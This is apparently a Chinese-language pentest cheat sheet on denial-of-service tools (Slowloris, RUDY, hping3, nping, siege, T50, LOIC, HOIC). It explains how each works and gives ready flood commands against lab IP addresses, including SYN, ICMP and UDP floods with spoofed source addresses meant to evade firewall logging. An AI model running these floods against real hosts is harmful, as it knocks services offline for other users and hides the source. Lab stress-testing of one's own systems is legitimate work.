# Slowhttptest介绍

编译安装：https://github.com/shekyan/slowhttptest/wiki/InstallationAndUsage
https://blog.csdn.net/wanghuiqi2008/article/details/54344223

# Slowloris介绍
Slowloris基本上是一个影响线程服务器的HTTP拒绝服务攻击。它是这样工作的：
1、我们开始制作大量的HTTP请求。
2、我们定期发送headers（每秒〜15秒）以保持连接的打开状态。
3、除非服务器关闭，否则我们绝不会关闭连接。如果服务器关闭一个连接，我们创建一个新的继续执行相同的操作。
因此：这样就会耗尽服务器线程池，并且服务器无法回复其他人。
slowloris就是一个python库直接用pip安装就可以了。pip install slowloris

# rudy
慢速应用层HTTP POST攻击，与slowhttptest原理相同
每次只传输一个字节的数据，耗死你
美剧黑客军团”中曾提到此攻击手段
攻击有表单WEB页面，攻击时需指定攻击的参数名称

# hping3
几乎可以定制发送任何tcp/ip数据包，用于测试FW、端口扫描、性能测试
-c	发送数据包的数目
-d	发送数据包大小
-S	使用syn，设置syn的flag
-P	使用push
-U	使用urg
-A	使用ack	
-F	使用fin
-R	使用rst
-w	窗口大小，windows发送字节(默认64)
–rand-source	随机源地址模式
-q	安静模式
-n	数字化输出，象征性输出主机地址
-a	伪造一个源地址，收不到回复包，伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。

1、syn flood 攻击
hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 目标ip
hping3 -S -P -U -p 80 --flood --rand-source 10.10.10.132
hping3 -SARFUP -p 80 --flood --rand-source 10.10.10.132 (TCP Flood)


2、ICMP Flood 攻击
hping3 -q -n -a 1.1.1.1 –icmp -d 200 --flood 10.10.10.132

3、UDP Flood 攻击
hping3 -a 1.1.1.1 –udp -s 53 -d 100 -p 53 --flood 10.10.10.132



# nping
tcp全连接Dos攻击
nping --tcp-connect --rate=10000 -c 1000000000 -q 1.1.1.1
--rate	每秒发送包的数量
-c	计数

# siege
Siege是linux下的一个web系统的压力测试工具，支持多链接，支持get和post请求，可以对web系统进行多并发下持续请求的压力测试
http/https压力测试工具，模拟多个用户并发访问请求

siege -i -c 1000 http://10.10.10.36/dvwa/login.php -A httttttp
-c	指定并发数
-i	internet系统
-A, –user-agent=”text”	设置代理测试请求

# T50
网络层压力测试，测试网络基础设施在面临压力、过载和攻击时的运行状况。甚至在渗透测试时，执行拒绝服务的测试。

t50 10.10.10.101 --flood --turbo -S --protocol TCP --dport 80
t50 10.10.10.101 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22


# LOIC
是Web应用程序的Dos/DDos攻击，它可用TCP数据包、UDP数据包、HTTP请求对目标网站进行Dos/DDos测试，攻击手段主要是以无限循环方式（无僵尸网络、单一url）发送数据。是一种淹没式工具，能产生大量流量，占满目标网络或应用资源，造成拒绝服务。
LOIC是用C#语言写的，由于程序设计上”有意或无意”留下的BUG导致” 一旦开始攻击在退出进程前无法真正停止攻击“，潜在增大了攻击效果。
用法：填写需要测试攻击的网站或者ip地址，填完后锁定lock on。然后选择需要测试攻击的方法，填写线程数，不过有个上限，看你电脑了
.net

# HOIC
HOIC是高轨道离子炮的缩写，一款用RealBasic开发的DoS工具。最初一些人使用LOIC进行DoS，后来这些人被捕了，另外一些人开发了HOIC以示抗议。(在工具的攻击包中，有一个说明：Brothers one of our aids has been arrested and detained for merely using the loic we must show them that this is a mistake) RealBasic是一种类似VB6的编程语言，可以生成在Windows、Linux、Mac OS上运行的应用程序。HOIC是完全开源的
可以配置攻击脚本，实际靠大量的HTTP请求进行DoS。其具有如下特点：高速多线程的HTTP洪水攻击；一次可同时洪水攻击高达256个网站；内置脚本系统，允许自行修改设置脚本，用来阻挠DDoS攻击的防御措施，并增加DOS输出；能够选择攻击的线程数。